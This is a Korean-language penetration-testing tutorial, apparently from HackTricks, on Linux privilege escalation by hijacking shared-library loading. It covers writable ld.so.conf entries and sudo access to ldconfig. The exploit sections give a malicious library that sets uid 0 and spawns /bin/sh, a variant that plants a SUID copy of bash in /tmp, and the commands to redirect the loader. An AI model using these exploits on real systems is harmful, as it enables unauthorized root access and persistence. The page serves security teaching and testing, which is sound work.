# ld.so privesc exploit 예제

{{#include ../../banners/hacktricks-training.md}}

## 환경 준비

다음 섹션에서 환경을 준비하는 데 사용할 파일의 코드를 확인할 수 있습니다.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **다음** 파일들을 동일한 폴더에 생성합니다.
2. **library**를 **compile**합니다: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`를 `/usr/lib`에 **copy**하고 cache를 refresh합니다: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **executable**을 **compile**합니다: `gcc sharedvuln.c -o sharedvuln -lcustom`

### environment 확인

_libcustom.so_가 **/usr/lib**에서 **loaded**되는지, 그리고 binary를 **execute**할 수 있는지 확인합니다.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 유용한 triage 명령어

실제 target을 공격할 때는 binary에 필요한 **정확한 library 이름**과 loader가 **현재 resolve하고 있는 항목**을 확인하세요:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
몇 가지 유용한 주의 사항:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf`는 일반적으로 **작동하지 않습니다**. 리디렉션이 현재 셸에서 수행되기 때문입니다. 대신
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`를 사용하세요.
- **SUID/privileged** 바이너리는 **secure-execution mode**에서 `LD_LIBRARY_PATH`/`LD_PRELOAD`를 무시하지만, `/etc/ld.so.conf`에서 가져온 디렉터리는 여전히 신뢰된 loader configuration의 일부이므로 이 잘못된 설정은 privileged 프로그램에 영향을 줄 수 있습니다.<sup>[[1]](#references)</sup>
- 최신 glibc 버전에서는 dynamic loader가 `--list-diagnostics`도 제공하므로, hijack이 예상대로 동작하지 않을 때 cache resolution 및 `glibc-hwcaps` 하위 디렉터리 선택을 debug하는 데 유용합니다.<sup>[[1]](#references)</sup>

## Exploit

이 시나리오에서는 누군가 _/etc/ld.so.conf/_ 내 파일에 **취약한 entry를 생성했다**고 가정하겠습니다:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
취약한 폴더는 쓰기 권한이 있는 _/home/ubuntu/lib_입니다.\
해당 경로에서 다음 코드를 **다운로드하고 컴파일**하세요:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
나중에 **root**(또는 다른 권한 있는 계정)가 취약한 바이너리를 실행할 것으로 예상된다면, 일반적으로 interactive shell을 생성하는 대신 **root-owned artifact**를 남겨 두는 것이 좋습니다. 예:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
그런 다음 privileged execution이 발생하면 `/tmp/rootbash -p`를 사용할 수 있습니다.

이제 **잘못 구성된** 경로 내부에 악성 libcustom library를 **생성했으므로**, **reboot**가 발생하거나 root 사용자가 **`ldconfig`**를 실행할 때까지 기다려야 합니다(_이 binary를 **sudo**로 실행할 수 있거나 **suid bit**가 설정되어 있는 경우 직접 실행할 수 있습니다_).

이 작업이 완료되면 **`sharedvuln` executable이 `libcustom.so` library를 어느 위치에서 로드하는지 다시 확인합니다**:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
보시다시피 **`/home/ubuntu/lib`에서 이를 로드**하며, 어떤 사용자가 이를 실행하면 셸이 실행됩니다:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> 이 예시에서는 privileges를 escalate하지 않았다는 점에 유의하세요. 하지만 실행되는 commands를 수정하고 **root 또는 다른 privileged user가 vulnerable binary를 실행할 때까지 기다리면** privileges를 escalate할 수 있습니다.

### 기타 misconfigurations - Same vuln

이전 예시에서는 administrator가 **`/etc/ld.so.conf.d/` 내부의 configuration file에 non-privileged folder를 설정한** misconfiguration을 가정했습니다.\
하지만 동일한 vulnerability를 발생시킬 수 있는 다른 misconfigurations도 있습니다. `/etc/ld.so.conf.d` 내부의 **config file**, `/etc/ld.so.conf.d` folder 또는 `/etc/ld.so.conf` file에 **write permissions**이 있다면 동일한 vulnerability를 configure하고 exploit할 수 있습니다.

## Exploit 2

**`ldconfig`에 대한 sudo privileges가 있다고 가정해 봅시다.**\
`ldconfig`가 **conf files를 어디에서 load할지 지정할 수 있으므로**, 이를 이용해 `ldconfig`가 arbitrary folders를 load하도록 만들 수 있습니다.<sup>[[2]](#references)</sup>\
이제 `"/tmp"`를 load하는 데 필요한 files와 folders를 생성해 보겠습니다:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
이제 **previous exploit**에서 설명한 대로 **malicious library를 `/tmp` 안에 생성**합니다.\
그리고 마지막으로 path를 로드하고 binary가 어느 위치에서 library를 로드하는지 확인합니다:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**보시다시피 `ldconfig`에 대한 sudo 권한이 있으면 동일한 취약점을 악용할 수 있습니다.**

## 참고 자료

- [1] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)

{{#include ../../banners/hacktricks-training.md}}
